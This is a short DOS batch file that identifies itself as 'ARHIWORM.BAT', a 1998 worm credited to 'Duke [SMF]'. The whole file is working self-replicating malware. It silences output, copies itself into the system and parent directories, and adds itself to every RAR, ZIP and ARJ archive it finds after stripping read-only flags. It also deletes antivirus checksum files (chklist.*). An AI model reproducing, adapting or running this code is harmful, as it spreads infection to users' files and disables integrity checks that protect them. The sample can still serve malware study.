@echo off
if "%1"=="#r#" goto rar
if "%1"=="#z#" goto zip
if "%1"=="#a#" goto arj
ctty nul
copy %0 c:\dos\%0
copy %0 c:\windows\%0
copy %0 c:\win95\%0
copy %0 c:\%0
copy %0 ..\%0
ctty con
for %%r in (*.rar) do call %0 #r# %%r
for %%z in (*.zip) do call %0 #z# %%z
for %%a in (*.arj) do call %0 #a# %%a
ctty nul
del chklist.*
ctty con
goto end
:rar
attrib -r %2
rar a -tk -y -c- -o+ %2 %0 >nul
goto end
:zip
attrib -r %2
pkzip %2 %0 >nul
goto end
:arj
attrib -r %2
arj a %2 %0 >nul
:end
echo on
@rem ARHIWORM.BAT v2.x - file's worm  (c) by Duke [SMF] 9.06.98
